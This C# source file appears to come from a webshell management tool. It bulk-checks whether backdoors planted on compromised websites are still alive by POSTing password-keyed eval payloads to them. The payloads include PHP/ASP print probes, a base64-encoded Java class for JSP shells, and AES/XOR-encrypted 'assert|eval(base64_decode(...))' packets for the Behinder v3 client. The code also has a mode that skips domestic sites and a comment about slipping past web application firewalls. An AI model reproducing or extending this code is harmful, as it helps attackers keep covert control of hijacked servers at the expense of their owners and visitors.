using C2.Core;
using C2.Utils;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using static C2.Utils.GuarderUtil;

namespace C2.Business.CastleBravo.WebShellTool
{
    public partial class WebShellManageForm
    {
        private int cacheHit = 0;
        class CheckAliveResult
        {
            public bool done = false;
            public bool alive = false;
            public bool safeM = false;
            public CheckAliveResult(bool s = false)
            {
                safeM = s;
            }
        }

        enum ResetTypeEnum
        {
            重新开始,
            重新开始_境外站,
            继续上次,
            继续上次_境外,
            选中项验活,
            二刷不活
        }

        private int NumberOfThread { get => this.threadNumberButton.SelectedIndex; }
        // 并发验活缓存项
        // 加速原理: 开始前先根据验活场景构造待验活项缓存
        //           主线程从前往后逐项验活
        //           其他线程对缓存中记录从后往前N线程并发验活,并把结果记录入缓存
        //           主线程每次验活前,先查看是否在缓存中此项是否已经被验过了
        //           
        // 因为并发验活涉及到层层反馈结果到界面更新,这样设计,改动最小
        private Dictionary<WebShellTaskConfig, CheckAliveResult> cache;

        // 根据不同的场景设置加速缓存里的内容
        private void ResetCheckCache(ResetTypeEnum type)
        {
            actionNeedStop = false;
            cacheHit = 0;
            cache.Clear();
            // 跳过初始几项
            for (int i = 0; i < LV.Items.Count; i++)
            {
                ListViewItem lvi = LV.Items[i];
                WebShellTaskConfig task = lvi.Tag as WebShellTaskConfig;
                switch (type)
                {
                    case ResetTypeEnum.重新开始:
                        cache.Add(task, new CheckAliveResult());
                        break;
                    case ResetTypeEnum.重新开始_境外站:
                        cache.Add(task, new CheckAliveResult(true));
                        break;
                    case ResetTypeEnum.继续上次:
                        if (lvi.SubItems[5].Text.Trim().IsNullOrEmpty())
                            cache.Add(task, new CheckAliveResult());
                        break;
                    case ResetTypeEnum.继续上次_境外:
                        if (lvi.SubItems[5].Text.Trim().IsNullOrEmpty())
                            cache.Add(task, new CheckAliveResult(true));
                        break;
                    case ResetTypeEnum.选中项验活:
                        if (lvi.Selected)
                            cache.Add(task, new CheckAliveResult());
                        break;
                    case ResetTypeEnum.二刷不活:
                        if (lvi.SubItems[5].Text.Trim().In(new string[] { "×", "待" }))
                            cache.Add(task, new CheckAliveResult());
                        break;
                }
            }
        }

        private void CheckAliveSpeedUpBackground()
        {
            // 上下文变量复刻
            int numberOfThread = NumberOfThread;
            for (int nt = 0; nt < numberOfThread; nt++)
            {
                int threadID = nt;  // 上下文变量复刻
                Task.Run(() =>
                {
                    //Console.WriteLine(string.Format("启动验活后台线程 : {0}", threadID));
                    int id = 0;
                    foreach (var kv in cache)
                    {
                        if (actionNeedStop)
                            break;
                        // 分发任务
                        if (id++ % numberOfThread == threadID)
                        {
                            //Console.WriteLine(string.Format("验活后台线程 {0} : 验活任务ID - {1}" , threadID, id - 1));
                            kv.Value.alive = CheckAliveOneTaskAsyn(kv.Key as WebShellTaskConfig, kv.Value.safeM) == "√";
                            kv.Value.done = true;
                        }
                    }
                });
            }
        }

        private void CheckAliveAll(bool skipAlive, bool safeMode)
        {
            DoCheckAliveItems(LV.Items, skipAlive, safeMode);
        }

        private void DoCheckAliveItems(IList items, bool skipAlive, bool safeMode)
        {
            s = DateTime.Now;
            using (new ControlEnableGuarder(this.contextMenuStrip))
            using (new ToolStripItemEnableGuarder(this.enableItems))
            using (new ToolStripItemTextGuarder(this.actionStatusLabel, "进行中", "已完成"))
                foreach (ListViewItem lvi in items)
                {
                    if (actionNeedStop)
                        break;
                    // 启用二刷
                    if (skipAlive && lvi.SubItems[5].Text != "待")
                        continue;
                    UpdateAliveItems(lvi, safeMode);
                    UpdateProgress();
                    CheckSavePoint(); // 5分钟保存一次
                }
            InitializeLock();//验活不影响功能加锁
        }

        private bool CacheCheckAlive(WebShellTaskConfig task)
        {
            // 先检查是否命中缓存
            if (cache.ContainsKey(task) && cache[task].done && ++cacheHit > 0)
                return cache[task].alive;
                
            // WebClient的超时是响应超时, 但有时候网页会有响应,但加载慢, 需要整体超时控制
            return DoEventsWait(5, Task.Run(() => PostCheckAlive(task)));
        }

        private bool PostCheckAlive(WebShellTaskConfig task)
        {
            try
            {
                string url = NetUtil.FormatUrl(task.Url);
                int seed = RandomUtil.RandomInt(31415000, 31415926);
                string result = string.Empty;
                List<string> payloads = GenWebshellPayload(task, seed);
                foreach (string payload in payloads)
                {
                    result = WebClientEx.Post(url, payload, 15000, Proxy);
                    if (task.TrojanType == "jspEval")
                        return result.Contains("black cloud");
                    if (result.Contains(seed.ToString()))
                        return true;
                }
                return false;
            }
            catch { return false; }

        }

        private List<string> GenWebshellPayload(WebShellTaskConfig task, int seed)
        {
            List<string> payloads = new List<string>();
            string pass = task.Password;
            // 默认按php算
            string payload = GenPayload(task.TrojanType, seed);

            if (task.ClientVersion == "三代冰蝎") //目前只支持冰蝎php、aes加密报文
            {
                string bxPayload = string.Format("assert|eval(base64_decode('{0}'));", ST.EncodeBase64(payload));
                payloads.Add(ClientSetting.AES128Encrypt(bxPayload, pass));
                payloads.Add(ClientSetting.XOREncrypt(bxPayload, pass));
                if (Regex.IsMatch(pass, "[a-f0-9]{16}"))
                {
                    payloads.Add(ST.AES128CBCEncrypt(bxPayload, pass));
                    payloads.Add(ClientSetting.XOREncrypt(bxPayload, pass, false));
                }

            }
            else if (task.TrojanType != "自动判断")
            {
                payloads.Add(pass + "=" + payload);
            }
            else
            {
                foreach (string type in Global.TrojanTypes)
                    payloads.Add(pass + "=" + GenPayload(type, seed));
            }
            return payloads;

        }

        private string GenPayload(string trojanType, int seed)
        {
            switch (trojanType)
            {
                // 有些网站会直接回显,这里加入运算逻辑
                // 报文用减法运算,加号容易被url转码成空格
                case "phpEval":
                    return string.Format("print({0}-1);", seed + 1);
                case "aspEval":
                    return string.Format("response.write({0}-1)", seed + 1);
                case "aspxEval":
                    return string.Format("response.write({0}-1)", seed + 1);
                case "jspEval":
                    return "yv66vgAAADQAQwoADgAoBwApCgACACoIACsLACwALQsALAAuCAAvCgAwADELACwAMgcAMwoACgA0CgAOADUHADYHADcBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEACUxQYXlsb2FkOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAANvYmoBABJMamF2YS9sYW5nL09iamVjdDsBAARwY3R4AQAfTGphdmF4L3NlcnZsZXQvanNwL1BhZ2VDb250ZXh0OwEACHJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEADVN0YWNrTWFwVGFibGUHADYHADcHACkHADgHADMBAApTb3VyY2VGaWxlAQAMUGF5bG9hZC5qYXZhDAAPABABAB1qYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dAwAOQA6AQAXdGV4dC9odG1sO2NoYXJzZXQ9VVRGLTgHADgMADsAPAwAPQA%2BAQALYmxhY2sgY2xvdWQHAD8MAEAAPAwAQQAQAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAQgAQDAAWABcBAAdQYXlsb2FkAQAQamF2YS9sYW5nL09iamVjdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQALZ2V0UmVzcG9uc2UBACEoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQALZmx1c2hCdWZmZXIBAA9wcmludFN0YWNrVHJhY2UAIQANAA4AAAAAAAIAAQAPABAAAQARAAAALwABAAEAAAAFKrcAAbEAAAACABIAAAAGAAEAAAAFABMAAAAMAAEAAAAFABQAFQAAAAEAFgAXAAEAEQAAAMwAAgAFAAAAMyvAAAJNLLYAA04tEgS5AAUCAC25AAYBABIHtgAILbkACQEApwAKOgQZBLYACyortwAMrAABAAoAIwAmAAoAAwASAAAAJgAJAAAACAAFAAkACgANABIADgAdAA8AIwASACYAEAAoABEALQATABMAAAA0AAUAKAAFABgAGQAEAAAAMwAUABUAAAAAADMAGgAbAAEABQAuABwAHQACAAoAKQAeAB8AAwAgAAAAGQAC%2FwAmAAQHACEHACIHACMHACQAAQcAJQYAAQAmAAAAAgAn";
                default:
                    return string.Format("print({0}-1);", seed + 1);

            }
        }

        private string CheckAliveOneTaskAsyn(WebShellTaskConfig task, bool safeMode)
        {
            if (safeMode && RefreshIPAddress(task))
                return "跳";
            if (PostCheckAlive(task))
                return "√";

            return "×";
        }
        private string CheckAliveOneTaskSync(WebShellTaskConfig task, bool safeMode)
        {
            string status = "×";
            using (GuarderUtil.WaitCursor)
            {
                // safe模式下 跳过国内网站
                bool isChina = RefreshIPAddress(task);
                if (safeMode && isChina)
                    return "跳";

                // 我总结的print穿透WAF大法
                if (CacheCheckAlive(task))
                    return "√";
            }
            return status;
        }


        private void DoCheckAliveContinue(bool safeMode)
        {
            ResetProgressMenuValue(CountStatusBlankItem());

            if (CountStatusBlankItem() == 0)
                progressMenu.Text = "完成";

            CheckAliveContinue(safeMode);
            EndCheckAlive();
        }

        private void CheckAliveContinue(bool safeMode)
        {
            s = DateTime.Now;
            using (new ControlEnableGuarder(this.contextMenuStrip))
            using (new ToolStripItemEnableGuarder(this.enableItems))
            using (new ToolStripItemTextGuarder(this.actionStatusLabel, "进行中", "已完成"))
                foreach (ListViewItem lvi in LV.Items)
                {
                    if (actionNeedStop)
                        break;
                    // 对留存的空状态验活
                    if (!lvi.SubItems[5].Text.Trim().IsNullOrEmpty())
                        continue;
                    UpdateAliveItems(lvi, safeMode);
                    UpdateProgress();
                    CheckSavePoint(); // 5分钟保存一次
                }
            InitializeLock();//验活不影响功能加锁
        }

        private void EndCheckAlive()
        {
            RefreshTasks();
            SaveDB();
        }
    }
}
